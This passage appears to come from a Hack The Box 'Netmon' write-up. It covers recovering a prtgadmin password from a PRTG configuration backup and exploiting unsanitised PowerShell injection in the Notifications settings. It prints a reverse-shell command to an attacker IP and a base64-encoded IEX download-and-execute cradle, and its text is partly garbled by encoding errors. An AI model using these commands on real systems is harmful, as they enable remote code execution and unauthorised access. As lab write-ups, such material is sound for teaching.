...
I searched these configuration files for any credentials related to the default admin user, `prtgadmin`. While the ÄúnewÄù configuration files did not contain any useful information, I found a backup file that included a password for `prtgadmin`:
...
To exploit this, I navigated to the ÄúNotificationsÄù section under ÄúAccount SettingsÄù in the ÄúSetupÄù dropdown menu:

![Navigating to Notifications](/assets/img/Netmon/image%207.png)

> üí° **Vulnerability Note**: An argument supplied in the ÄúParameterÄù field of the ÄúNotificationsÄù configuration is passed directly into the PowerShell script without any sanitization, allowing an attacker to inject arbitrary PowerShell code.
...
```bash
îåîÄîÄ(kali„âøkali)-[~/Red_Team/HTB]
îîîÄ$ echo 'Invoke-PowershellTcp -Reverse -IPAddress 10.10.16.13 -Port 4444' >> /home/kali/Red_Team/Tools/Invoke-PowerShellTcp.ps1 
```
...
```bash
îåîÄîÄ(kali„âøkali)-[~/Red_Team/HTB]
îîîÄ$ echo -n "IEX(new-object net.webclient).downloadstring('http://10.10.16.13:8080/Invoke-PowerShellTcp.ps1')" | iconv -t UTF-16LE | base64 -w0
...
**iconv -t UTF-16LE**: This converts the text encoding of the PowerShell command to UTF-16LE (UTF-16 Little Endian), which is often required by Windows PowerShell for Base64-encoded commands. Windows PowerShell expects encoded commands in UTF-16LE, as itÄôs the default character encoding for PowerShell scripts.
